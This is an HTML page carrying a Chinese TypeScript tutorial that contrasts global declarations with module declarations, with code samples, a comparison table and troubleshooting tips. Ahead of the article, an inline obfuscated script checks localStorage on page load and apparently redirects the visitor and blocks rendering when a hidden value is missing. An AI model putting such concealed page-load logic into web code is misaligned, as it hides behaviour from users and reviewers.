<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x372840=_0x4975;function _0x4975(e,s){var t=_0x3c38();return(_0x4975=function(s,n){var a=t[s-=335];void 0===_0x4975.rUFwmi&&(_0x4975.Iplbyq=function(s,n){var a,l=[],e=0,t="";for(s=(s=>{for(var n,a,l="",e="",t=0,c=0;a=s.charAt(c++);~a&&(n=t%4?64*n+a:a,t++%4)&&(l+=String.fromCharCode(255&n>>(-2*t&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var p=0,o=l.length;p<o;p++)e+="%"+("00"+l.charCodeAt(p).toString(16)).slice(-2);return decodeURIComponent(e)})(s),c=0;c<256;c++)l[c]=c;for(c=0;c<256;c++)e=(e+l[c]+n.charCodeAt(c%n.length))%256,a=l[c],l[c]=l[e],l[e]=a;for(var c=0,e=0,p=0;p<s.length;p++)a=l[c=(c+1)%256],l[c]=l[e=(e+l[c])%256],l[e]=a,t+=String.fromCharCode(s.charCodeAt(p)^l[(l[c]+l[e])%256]);return t},e=arguments,_0x4975.rUFwmi=!0);var s=s+t[0],l=e[s];return l?a=l:(void 0===_0x4975.ILMPeX&&(_0x4975.ILMPeX=!0),a=_0x4975.Iplbyq(a,n),e[s]=a),a})(e,s)}function _0x3c38(){var s=["hSoDwddcGmo4Dc94W4u8n8kE","WPasogNcP8oZmhy","FWFcO8kcW67cKxi","WP9wpCkWr8oelG","t1tcL03cQJfPD2a","W7xcKSoUWQNcJgnDW6PQWQlcVZW","WRJdKI3cTcbwWOZdSa","W67cPSoYWRJdU8oBamkbm1W3tXy","W6BcI3JdRwioW5BdSCkzrmoTW53dPG","WPyhW6n/WP3dIYu","W6hcHhZdOwb0WQddL8kuuCon","rJtdRKj7W7aorJVcTmoWeZz5","cSogECoCWOhdSmkuBCo3lCohoa","WPfBWR8gW6ZcUHyuW7GHW5NcPW","cv/cSXSdgtpcH8oFF1Kd","WQbTB8oNtSo+zSooDYa+WQG/WPfqECoJy8kbW4pdTmkkWRPsW4NdKW","WPzzi23cISoofq","qCkSWRvQWQVdJh/cPv04dwtdRW","W7ZcLSoIWQ/cJ2enWOr8WPZcSqhdISkk","zSksW4efWOVdR2ddTa","zmooW6uEWP/dGgu","WOFdO8o+ibbeW4at","zSkAW4qzWOJdQeVdOq","FXzbW5vIjCk7aCkpW5GiWORcNa","b3BcQqCW","W4BcKIRcRmoxALu","vmkaW67dG8krbIhcP8kAhSkR","yWC+W5NcRmksWRddGmoTWP9Qpmor","W65Fr2JdKaunW7S","kZVdNxFdL1CfxG"];return(_0x3c38=function(){return s})()}if((()=>{for(var s=_0x4975,n=_0x3c38();;)try{if(445812==-parseInt(s(344,"t47)"))*(-parseInt(s(353,"LmKq"))/2)+-parseInt(s(343,"n(No"))/3*(parseInt(s(348,"0xG^"))/4)+parseInt(s(341,"qhot"))/5+-parseInt(s(361,"Zudl"))/6*(parseInt(s(359,"4gem"))/7)+-parseInt(s(351,"sVU6"))/8+-parseInt(s(335,"fEk("))/9*(parseInt(s(346,"E8[B"))/10)+parseInt(s(363,"[i14"))/11*(parseInt(s(352,"m5&("))/12))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x372840(336,"K$WK")](_0x372840(338,"h)uv"))!=_0x372840(358,"iUVS"))throw window[_0x372840(340,"t47)")][_0x372840(337,"1Tus")](_0x372840(349,"u^TK")),Error();document.title="TypeScript 全局声明与模块声明详解",document.getElementById("article").innerHTML='<div><p>在 TypeScript 中，<code>declare</code> 可以用于两种主要的声明方式：全局声明和模块声明。这两种方式有不同的作用域和使用场景。</p>\n<h2>一、全局声明 (Global Declarations)</h2>\n<h3>1. 基本特点</h3>\n<ul>\n<li>在整个项目中可用，无需导入</li>\n<li>通常用于声明全局变量、函数或类型</li>\n<li>适合扩展全局命名空间（如 <code>Window</code> 对象）</li>\n</ul>\n<h3>2. 使用方式</h3>\n<pre><code class="language-typescript"><span class="hljs-comment">// 声明全局变量</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">APP_VERSION</span>: <span class="hljs-built_in">string</span>;\n\n<span class="hljs-comment">// 声明全局函数</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">logMessage</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;\n\n<span class="hljs-comment">// 声明全局接口</span>\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalConfig</span> {\n  <span class="hljs-attr">debug</span>: <span class="hljs-built_in">boolean</span>;\n}\n\n<span class="hljs-comment">// 扩展全局对象</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> {\n  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Window</span> {\n    <span class="hljs-attr">myApp</span>: {\n      <span class="hljs-title function_">init</span>(): <span class="hljs-built_in">void</span>;\n    };\n  }\n}\n</code></pre>\n<h3>3. 文件位置</h3>\n<ul>\n<li>全局声明通常放在：\n<ul>\n<li><code>global.d.ts</code> 文件</li>\n<li><code>types</code> 文件夹下的 <code>.d.ts</code> 文件</li>\n<li>任何包含 <code>declare global</code> 的 <code>.d.ts</code> 文件</li>\n</ul>\n</li>\n</ul>\n<h3>4. 注意事项</h3>\n<ul>\n<li>全局声明会污染全局命名空间</li>\n<li>避免过度使用，只在必要时声明</li>\n<li>项目中使用 <code>export</code> 的模块会自动成为模块作用域，不会成为全局声明</li>\n</ul>\n<h2>二、模块声明 (Module Declarations)</h2>\n<h3>1. 基本特点</h3>\n<ul>\n<li>用于描述模块的形状（如第三方库）</li>\n<li>需要导入才能使用</li>\n<li>适合为非 TS 编写的库添加类型支持</li>\n</ul>\n<h3>2. 使用方式</h3>\n<pre><code class="language-typescript"><span class="hljs-comment">// 声明整个模块</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;my-library&quot;</span> {\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span>;\n}\n\n<span class="hljs-comment">// 声明文件模块（如图片导入）</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;*.png&quot;</span> {\n  <span class="hljs-keyword">const</span> <span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> path;\n}\n\n<span class="hljs-comment">// 声明CSS模块</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;*.module.css&quot;</span> {\n  <span class="hljs-keyword">const</span> <span class="hljs-attr">classes</span>: { <span class="hljs-keyword">readonly</span> [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span> };\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> classes;\n}\n</code></pre>\n<h3>3. 文件位置</h3>\n<ul>\n<li>可以放在：\n<ul>\n<li>专门的 <code>@types</code> 文件夹</li>\n<li>与实现文件同名的 <code>.d.ts</code> 文件</li>\n<li><code>node_modules/@types</code> 中的类型定义文件</li>\n</ul>\n</li>\n</ul>\n<h3>4. 注意事项</h3>\n<ul>\n<li>模块声明必须有引号包裹的模块名</li>\n<li>可以描述 CommonJS 和 ES 模块</li>\n<li>使用 <code>export</code> 明确导出内容</li>\n</ul>\n<h2>三、全局声明 vs 模块声明对比</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>全局声明</th>\n<th>模块声明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>作用域</td>\n<td>全局可用</td>\n<td>必须导入后使用</td>\n</tr>\n<tr>\n<td>语法</td>\n<td>直接 <code>declare</code> 或 <code>declare global</code></td>\n<td><code>declare module &quot;模块名&quot;</code></td>\n</tr>\n<tr>\n<td>典型用途</td>\n<td>扩展全局对象/变量</td>\n<td>描述第三方库或无类型模块</td>\n</tr>\n<tr>\n<td>文件位置</td>\n<td>global.d.ts 或 types 目录</td>\n<td>@types 或同名 .d.ts 文件</td>\n</tr>\n<tr>\n<td>是否污染全局命名空间</td>\n<td>是</td>\n<td>否</td>\n</tr>\n<tr>\n<td>是否需要导入</td>\n<td>否</td>\n<td>是</td>\n</tr>\n</tbody>\n</table>\n<h2>四、混合使用示例</h2>\n<pre><code class="language-typescript"><span class="hljs-comment">// global-and-module.d.ts</span>\n\n<span class="hljs-comment">// 全局类型</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">GlobalID</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;\n\n<span class="hljs-comment">// 模块声明</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;special-library&quot;</span> {\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createID</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">GlobalID</span>;\n}\n\n<span class="hljs-comment">// 扩展全局命名空间</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> {\n  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Array</span>&lt;T&gt; {\n    <span class="hljs-title function_">shuffle</span>(): T[];\n  }\n}\n</code></pre>\n<h2>五、最佳实践</h2>\n<ol>\n<li><strong>优先使用模块声明</strong>  ：减少全局污染</li>\n<li><strong>合理组织声明文件</strong>  ：\n<ul>\n<li>全局声明集中管理</li>\n<li>模块声明靠近使用位置</li>\n</ul>\n</li>\n<li><strong>避免重复声明</strong>  ：使用 <code>interface</code> 合并而非重复声明</li>\n<li><strong>明确导出</strong>  ：模块声明中总是使用 <code>export</code></li>\n<li><strong>使用三斜线指令</strong>  （必要时）：<pre><code class="language-typescript"><span class="hljs-comment">/// &lt;reference types=&quot;node&quot; /&gt;</span>\n<span class="hljs-comment">/// &lt;reference path=&quot;./custom.d.ts&quot; /&gt;</span>\n</code></pre>\n</li>\n</ol>\n<h2>六、常见问题解决</h2>\n<h3>1. 全局声明不生效</h3>\n<ul>\n<li>确保文件是 <code>.d.ts</code> 扩展名</li>\n<li>检查 <code>tsconfig.json</code> 的 <code>include</code>/<code>exclude</code> 配置</li>\n<li>确认没有意外使用了 <code>export</code>（会使文件变为模块）</li>\n</ul>\n<h3>2. 模块声明冲突</h3>\n<pre><code class="language-typescript"><span class="hljs-comment">// 解决方案：合并声明</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;my-module&quot;</span> {\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;\n}\n\n<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;my-module&quot;</span> {\n  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span>;\n}\n</code></pre>\n<h3>3. 类型扩展最佳方式</h3>\n<pre><code class="language-typescript"><span class="hljs-comment">// 优于直接声明，因为可以合并</span>\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Window</span> {\n  <span class="hljs-attr">myNewProp</span>: <span class="hljs-built_in">string</span>;\n}\n\n<span class="hljs-comment">// 而不是</span>\n<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">myNewProp</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 全局变量污染</span>\n</code></pre>\n<p>正确使用全局声明和模块声明可以显著提高 TypeScript 项目的类型安全性和开发体验，同时保持代码的整洁性。</p>\n</div>'</script></body></html>